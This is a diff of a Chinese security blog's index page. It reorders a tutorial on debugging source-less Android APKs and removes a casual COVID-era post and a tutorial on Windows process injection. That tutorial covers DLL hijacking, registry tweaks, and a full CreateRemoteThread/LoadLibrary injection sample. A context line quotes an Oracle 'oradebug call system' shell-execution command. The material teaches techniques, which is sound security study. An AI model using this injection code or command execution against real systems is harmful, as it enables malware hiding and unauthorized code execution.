+<h2 id="4-增加Android-Stuido的调试选项"><a href="#4-增加Android-Stuido的调试选项" class="headerlink" title="4. 增加Android Stuido的调试选项"></a>4. 增加Android Stuido的调试选项</h2><p>Android Studio 界面上选择 Run-&gt; Edit Configurations，点击+号，新建remote类型调试<br>器，默认的监听端口为5005，如果默认端口被占用则需要修改端口号。</p>
+<h2 id="5-以调试模式启动应用"><a href="#5-以调试模式启动应用" class="headerlink" title="5. 以调试模式启动应用"></a>5. 以调试模式启动应用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n aa.bb/.activity</span><br></pre></td></tr></table></figure>
+
+<p>进程将挂起，aa.bb是package name，.activity 是要启动的activity 一般指定MainAcvitiy即可</p>
+<h2 id="6-建立调试通道"><a href="#6-建立调试通道" class="headerlink" title="6. 建立调试通道"></a>6. 建立调试通道</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell ps | grep aa.bb</span><br></pre></td></tr></table></figure>
+
+<p>获得调试进程的pid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:5005 jdwp:debug_process_pid</span><br></pre></td></tr></table></figure>
+
+<p>执行命令后，可以看到adb监听本地5005 端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; netstat -antp | grep 5005</span><br><span class="line"> tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      4728/adb  </span><br></pre></td></tr></table></figure>
+
+<h2 id="7-设置断点，调试"><a href="#7-设置断点，调试" class="headerlink" title="7. 设置断点，调试"></a>7. 设置断点，调试</h2><p>点击源码左侧栏可以设置断点，点击工具栏上的debug （一个小虫的按钮），开始调试。在<br>这个步骤上我遇上了一个错误。</p>
+<p>java.io.IOException “handshake failed - connection prematurally closed”</p>
+<p>这个错误是因为adb版本问题，取消Android内部的adb集成就可以了。具体方法是<br>Tools -&gt; Android -&gt; Enable adb integration 取消掉前面的勾就可以了。</p>
+<p>如果看到Connected to the target VM, address: ‘localhost:5005’, transport: ‘socket’ 就大功告成了。</p>
+<h2 id="8-其他一些说明事项"><a href="#8-其他一些说明事项" class="headerlink" title="8. 其他一些说明事项"></a>8. 其他一些说明事项</h2><p>要调试apk程序是有一些要求的，下面几种情况可以调试apk程序。</p>
+<ul>
+<li>/default.prop ro.debuggable=1</li>
+</ul>
+<p>我的手机就属于这种情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getprop  | grep ro.debug</span><br><span class="line">[ro.debuggable]: [1]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>APK 中AndroidManifest.xml 有这句 android:debuggable=true</li>
+</ul>
 
       
     </div>
@@ -350,103 +595,6 @@
 <li><a target="_blank" rel="noopener" href="https://source.android.com/setup/build/downloading">https://source.android.com/setup/build/downloading</a></li>
 <li><a target="_blank" rel="noopener" href="https://source.android.com/setup/build/building">https://source.android.com/setup/build/building</a></li>
 <li><a target="_blank" rel="noopener" href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/apk_debug/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="henices">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/03/19/apk_debug/" class="post-title-link" itemprop="url">使用Android Studio 调试无源码apk程序</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Apk无源码调试的方法有很多，现在发现使用Android Studio 结合 JEB　感觉良好，<br>主要是参考　<a target="_blank" rel="noopener" href="http://www.jianshu.com/p/c7899e5ea182">http://www.jianshu.com/p/c7899e5ea182</a>　这篇记录下了具体步骤。</p>
-<h2 id="1-下载-smalidea"><a href="#1-下载-smalidea" class="headerlink" title="1. 下载 smalidea"></a>1. 下载 smalidea</h2><p><a target="_blank" rel="noopener" href="https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip">https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip</a></p>
-<p>在Android studio的插件仓库中没有找到这个插件，需要下载本地安装<br>File -&gt; Settings -&gt; Plugins -&gt; Install plugin from disk  选择下载的插件，重启后生效。</p>
-<h2 id="2-apktool-输出源码文件"><a href="#2-apktool-输出源码文件" class="headerlink" title="2. apktool 输出源码文件"></a>2. apktool 输出源码文件</h2><p><a target="_blank" rel="noopener" href="https://github.com/iBotPeaches/Apktool/releases/download/2.2.0/apktool_2.2.0.jar">https://github.com/iBotPeaches/Apktool/releases/download/2.2.0/apktool_2.2.0.jar</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool_2.2.0.jar d -f xx.apk -o xx</span><br></pre></td></tr></table></figure>
-
-<p>如果正常的将输出 smali 源码文件</p>
-<h2 id="3-Android-Studio-导入源码"><a href="#3-Android-Studio-导入源码" class="headerlink" title="3. Android Studio 导入源码"></a>3. Android Studio 导入源码</h2><p>File -&gt; New -&gt; import project  选择刚才导出的xx文件夹</p>
-<h2 id="4-增加Android-Stuido的调试选项"><a href="#4-增加Android-Stuido的调试选项" class="headerlink" title="4. 增加Android Stuido的调试选项"></a>4. 增加Android Stuido的调试选项</h2><p>Android Studio 界面上选择 Run-&gt; Edit Configurations，点击+号，新建remote类型调试<br>器，默认的监听端口为5005，如果默认端口被占用则需要修改端口号。</p>
-<h2 id="5-以调试模式启动应用"><a href="#5-以调试模式启动应用" class="headerlink" title="5. 以调试模式启动应用"></a>5. 以调试模式启动应用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n aa.bb/.activity</span><br></pre></td></tr></table></figure>
-
-<p>进程将挂起，aa.bb是package name，.activity 是要启动的activity 一般指定MainAcvitiy即可</p>
-<h2 id="6-建立调试通道"><a href="#6-建立调试通道" class="headerlink" title="6. 建立调试通道"></a>6. 建立调试通道</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell ps | grep aa.bb</span><br></pre></td></tr></table></figure>
-
-<p>获得调试进程的pid</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:5005 jdwp:debug_process_pid</span><br></pre></td></tr></table></figure>
-
-<p>执行命令后，可以看到adb监听本地5005 端口。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; netstat -antp | grep 5005</span><br><span class="line"> tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      4728/adb  </span><br></pre></td></tr></table></figure>
-
-<h2 id="7-设置断点，调试"><a href="#7-设置断点，调试" class="headerlink" title="7. 设置断点，调试"></a>7. 设置断点，调试</h2><p>点击源码左侧栏可以设置断点，点击工具栏上的debug （一个小虫的按钮），开始调试。在<br>这个步骤上我遇上了一个错误。</p>
-<p>java.io.IOException “handshake failed - connection prematurally closed”</p>
-<p>这个错误是因为adb版本问题，取消Android内部的adb集成就可以了。具体方法是<br>Tools -&gt; Android -&gt; Enable adb integration 取消掉前面的勾就可以了。</p>
-<p>如果看到Connected to the target VM, address: ‘localhost:5005’, transport: ‘socket’ 就大功告成了。</p>
-<h2 id="8-其他一些说明事项"><a href="#8-其他一些说明事项" class="headerlink" title="8. 其他一些说明事项"></a>8. 其他一些说明事项</h2><p>要调试apk程序是有一些要求的，下面几种情况可以调试apk程序。</p>
-<ul>
-<li>/default.prop ro.debuggable=1</li>
-</ul>
-<p>我的手机就属于这种情况</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getprop  | grep ro.debug</span><br><span class="line">[ro.debuggable]: [1]</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>APK 中AndroidManifest.xml 有这句 android:debuggable=true</li>
 </ul>
 
       
@@ -886,75 +1034,6 @@ oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/other/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="henices">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/03/19/other/" class="post-title-link" itemprop="url">一些杂谈</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>整个春节被武汉的新型冠状病毒肺炎搞得人心惶惶，2020 注定是我们这辈人难忘的一年，非典的时候比较小感觉没那么恐怖，现在的感觉就完全不一样了，整天都在洗手中度过。</p>
-<p>在病情扩散期间，大量消息满天飞，给政府提意见的更是比比皆是，但是大家都忽视了 一点，就是要相信专业。很多人不太明白专业和非专业之间的差距，可以想象一下你和一 个围棋九段的人下围棋，怎么换到医学领域大家就都是专家了？</p>
-<p>我看到一个建议轻征不隔离，把资源让给重症者。</p>
-<p>大家觉得这个建议如何？提这个建议的人说，主要依据是死亡人不多。这个犯了几个错误， 第一，要看死亡率，而不是死亡人数，患病的人多了，自然死人的就多了。第二，根据我 有限的常识，病毒是会自适应性的进化的，感染的人多了，可能就会产生更nb 的变种了。</p>
-<p>这个事情主要还是相信国家，相信我们的祖国。我觉得这个事情一定会解决了，只是时间 和损失程度问题，一季度的gdp 肯定是受影响了，希望疫情快点过去，天佑中华！</p>
-<p>最后希望所有看到此文的，新年幸福安康！</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/pdfium-fuzz.public/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1069,7 +1148,7 @@ oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/process_injection/">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/other/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1082,7 +1161,7 @@ oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/03/19/process_injection/" class="post-title-link" itemprop="url">Windows 进程注入</a>
+          <a href="/2020/03/19/other/" class="post-title-link" itemprop="url">一些杂谈</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1106,106 +1185,12 @@ oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="1-Process-Injection-方法总结"><a href="#1-Process-Injection-方法总结" class="headerlink" title="1. Process Injection 方法总结"></a>1. Process Injection 方法总结</h2><p>  进程注入是windows病毒和恶意软件最常用的手法之一，Windows下进程注入的方法比较<br>多，这里介绍常见的一些方法，以及相应的检查手段。</p>
-<h3 id="1-1-SetWindowsHookEx"><a href="#1-1-SetWindowsHookEx" class="headerlink" title="1.1 SetWindowsHookEx"></a>1.1 SetWindowsHookEx</h3><p> SetWindowsHookEx估计是大家最熟悉的方法了，这个是微软提供给我们使用正规用法。<br>往Windows的hook chain中安装hook 例程，监控系统某种类型的event, 使用这种方法需要<br>实现一个dll。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_  <span class="keyword">int</span> idHook,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_  HOOKPROC lpfn,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_  HINSTANCE hMod,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_  DWORD dwThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>dwThread 为0，将监管系统中所有线程。</li>
-<li>idHook        指定监控event的类型</li>
-<li>hMod          dll句柄</li>
-<li>lpfn          hook例程的指针</li>
-</ul>
-<p>MSDN给出了一个使用的例子：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HOOKPROC hkprcSysMsg;</span><br><span class="line"><span class="keyword">static</span> HINSTANCE hinstDLL; </span><br><span class="line"><span class="keyword">static</span> HHOOK hhookSysMsg; </span><br><span class="line"> </span><br><span class="line">hinstDLL = <span class="built_in">LoadLibrary</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;c:\\myapp\\sysmsg.dll&quot;</span>)); </span><br><span class="line">hkprcSysMsg = (HOOKPROC)<span class="built_in">GetProcAddress</span>(hinstDLL, <span class="string">&quot;SysMessageProc&quot;</span>); </span><br><span class="line"></span><br><span class="line">hhookSysMsg = <span class="built_in">SetWindowsHookEx</span>( </span><br><span class="line">                    WH_SYSMSGFILTER,</span><br><span class="line">                    hkprcSysMsg,</span><br><span class="line">                    hinstDLL,</span><br><span class="line">                    <span class="number">0</span>); </span><br></pre></td></tr></table></figure>
-
-<p>值得一提的是这个API只能监控GUI程序，console的程序是监控不了。当年使用的时候还吃<br>了亏。</p>
-<h3 id="1-2-lpk-dll"><a href="#1-2-lpk-dll" class="headerlink" title="1.2 lpk.dll"></a>1.2 lpk.dll</h3><p> 这是一种比较常见的方法，一般把这种方法称为 dll 劫持 (dll hijack),lpk.dll默认<br>的位置在，如果在其他的路径发现lpk.dll就需要需要注意了。</p>
-<p>  这种方法需要实现和原始的lpk.dll一样导出函数，每个函数都转向调用真正的lpk.dll<br>中的导出函数，这样对于程序来说是完全感觉不到什么异常变化的，但是却被伪造的lpk.dll<br>过了一道，所以称为为劫持。</p>
-<p>  这里有二个问题，值得思考。</p>
-<h4 id="如何能让程序加载我们的lpk-dll而不是系统真正的dll"><a href="#如何能让程序加载我们的lpk-dll而不是系统真正的dll" class="headerlink" title="如何能让程序加载我们的lpk.dll而不是系统真正的dll"></a>如何能让程序加载我们的lpk.dll而不是系统真正的dll</h4><p>  如果知道Windows查找dll的顺序，就很容易解决这个问题了，微软的MSDN网站很贴心地<br>  回答了我们的问题。</p>
-<p> <a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a. The directory from which the application loaded.</span><br><span class="line">b. The current directory.</span><br><span class="line">c. The system directory. Use the GetSystemDirectory function to get the path of this directory.</span><br><span class="line">d. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</span><br><span class="line">e. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.</span><br><span class="line">f. The directories that are listed in the PATH environment variable. Note that</span><br><span class="line">   this does not include the per-application path specified by the App</span><br><span class="line">   Paths registry key. The App Paths key is not used when computing the DLL</span><br><span class="line">   search path.</span><br></pre></td></tr></table></figure>
-<p>因此把lpk.dll放到运行的程序同一目录即可。</p>
-<h4 id="为什么选取lpk-dll"><a href="#为什么选取lpk-dll" class="headerlink" title="为什么选取lpk.dll"></a>为什么选取lpk.dll</h4><p>  Windows 7 开始，默认已经不加载LPK.dll了，要Windows 7 默认加载LPK.dll<br>  需要修改注册表，导入下面的注册表, 重启后生效</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]</span><br><span class="line">&quot;ExcludeFromKnownDlls&quot;=hex(7):6c,00,70,00,6b,00,2e,00,64,00,6c,00,6c,00,00,00,00,00</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="1-3-CreateRemoteThread"><a href="#1-3-CreateRemoteThread" class="headerlink" title="1.3  CreateRemoteThread"></a>1.3  CreateRemoteThread</h3><p>   CreateRemoteThread应该是非常常用的进程注入方法了，有两种常见的使用方法。API<br>原型如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function">HANDLE WINAPI <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_  LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>hProcess        要注入的进程的句柄</li>
-<li>lpStartAddress  远程进程中执行的函数的地址（指针）</li>
-<li>lpParameter     远程进程中执行的函数的参数的地址 （指针）</li>
-</ul>
-<h4 id="实现个DLL"><a href="#实现个DLL" class="headerlink" title="实现个DLL"></a>实现个DLL</h4><p>  第一种方法同样是跨进程调用LoadLibrary加载指定的DLL，我们自己实现一个DLL，就可以为所欲为了，呵呵。</p>
-<p>   从API原型中可以看出，需要把数据写入远程的进程，Windows系统提供了WriteProcssMemory<br>来干这个事，但是如何能够保证我们往远程进程写的地址是可写的呢?</p>
-<p>   答案是无法保证。。。所以比较稳妥的方法是我们自己在远程进程中申请一块可写的内<br>存，然后把我们的数据写到远程进程中去。</p>
-<p>   在远程进程中申请内存也有相应的API VirtualAllocEx, 把前前后后都串起来就可以远<br>程注入DLL了。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">HANDLE process = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, procID);</span><br><span class="line"><span class="keyword">if</span> (process == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the specified process couldn&#x27;t be found.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Get address of the LoadLibrary function.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID addr = (LPVOID)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the LoadLibraryA function was not found inside kernel32.dll library.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Allocate new memory region inside the process&#x27;s address space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID arg = (LPVOID)<span class="built_in">VirtualAllocEx</span>(process, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (arg == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the memory could not be allocated inside the chosen process.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Write the argument to LoadLibraryA to the process&#x27;s newly allocated memory region.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> n = <span class="built_in">WriteProcessMemory</span>(process, arg, buffer, <span class="built_in">strlen</span>(buffer), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: there was no bytes written to the process&#x27;s address space.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Inject our DLL into the process&#x27;s address space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">HANDLE threadID = <span class="built_in">CreateRemoteThread</span>(process, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)addr, arg, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (threadID == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the remote thread could not be created.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Success: the remote thread was successfully created.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Close the handle to the process, becuase we&#x27;ve already injected the DLL.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(process);</span><br></pre></td></tr></table></figure>
-
-<p>   前面的代码示例代码，看起来很正常，基本上CreateRemoteThread的例子都是这么写的<br>但是如果如何看的仔细，还是会发现一个问题，不是说lpStartAddress必须是远程进程中<br>的地址吗，可是LoadLibraryA的地址是注入进程的地址不是远程进程中的地址。</p>
-<p>  很多文章在这里都没有说透，但是牛书《Windows核心编程》对此有着详细的说明。根据<br>经验Windows系统总是把Kernel32.dll映射到进程的相同地址，Windows开启ASLR后，重启后<br>进程中Kernel32.dll的地址会发生变化，但是每个进程中Kernel32.dll的地址仍然相同！<br>所以我们可以在远程的进程使用本地进程的内存中的LoadLibraryA的地址。</p>
-<h4 id="写远程进程内存"><a href="#写远程进程内存" class="headerlink" title="写远程进程内存"></a>写远程进程内存</h4><p>   第二种方法是直接远程注入代码,不注入DLL,其实并不一定要调用CreateRemoteThread<br>还有好几种替代方法,</p>
-<ol>
-<li>CreateRemoteThread最终会调用NtCreateThreadEx Native API，可以直接调用这个<br>  Native API来启动远程的线程。</li>
-<li>RtlCreateUserThread </li>
-</ol>
-<h3 id="1-4-AppInit-DLLs"><a href="#1-4-AppInit-DLLs" class="headerlink" title="1.4 AppInit_DLLs"></a>1.4 AppInit_DLLs</h3><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code></p>
-<p>   这个键值被《Windows核心编程》介绍而格外出名，可执行文件在处理User32.dll的<br>DLL_PROCESS_ATTACH 时，会使用LoadLibirary加载AppInit_DLLS, 不链接User32.dll的程<br>序将不会加载AppInit_DLLS, 很少程序不需要链接User32.dll</p>
-<p>新版本的Windows增加了几个关键的键值，会对DLL的注入有影响。</p>
-<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs</code></p>
-<ul>
-<li>REG_DWORD 1 表示全局开启</li>
-<li>REG_DWORD 0 表示全局关闭</li>
-</ul>
-<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\RequireSignedAppInit_DLLs</code></p>
-<ul>
-<li>REG_DWORD 0 加载任意DLL</li>
-<li>REG_DWORD 1 只加载签名的DLL</li>
-</ul>
-<h3 id="1-5-QueueUserApc"><a href="#1-5-QueueUserApc" class="headerlink" title="1.5 QueueUserApc"></a>1.5 QueueUserApc</h3><p>QueueUserApc API 原型如下：</p>
-<p>DWORD WINAPI QueueUserAPC(<br>  <em>In</em>  PAPCFUNC pfnAPC,    // APC function<br>  <em>In</em>  HANDLE hThread,     // handle of thread<br>  <em>In</em>  ULONG_PTR dwData    // APc function parameter<br>);</p>
-<p>这个注入方法用的不多，但是也是老方法了，pjf在2007年《暴力注入explorer》的文章里<br>就提到了这种方法。作用是在线程的Apc队列插入一个用户模式下的APC 对象。</p>
-<p>APC 是 asynchronous procedure call 的缩写，每个线程都有自己的APC队列，在线程APC<br>队列中的APC对象的函数将被线程执行，但是用户模式下的APC对象里的函数并不一定会马上<br>执行（所以是异步的），除非线程是alertable状态。当线程是alertable状态是，APC队列<br>里的Apc对象，按照FIFO的顺序进行处理，执行APC函数。线程调用 SleepEx,<br>SignalObjectAndWait, WaitForSingleObjectEx, WaitForMultipleObjectsEx 或者<br>MsgWaitForMultipleObjectsEx时线程进入alertable状态。</p>
-<p>所以为了我们的函数能够尽快的执行，我们必须在目标进程所有的线程的APC队列中插入<br>APC 对象，基本上总有一个线程是alertable状态。</p>
-<p>核心伪代码如下：</p>
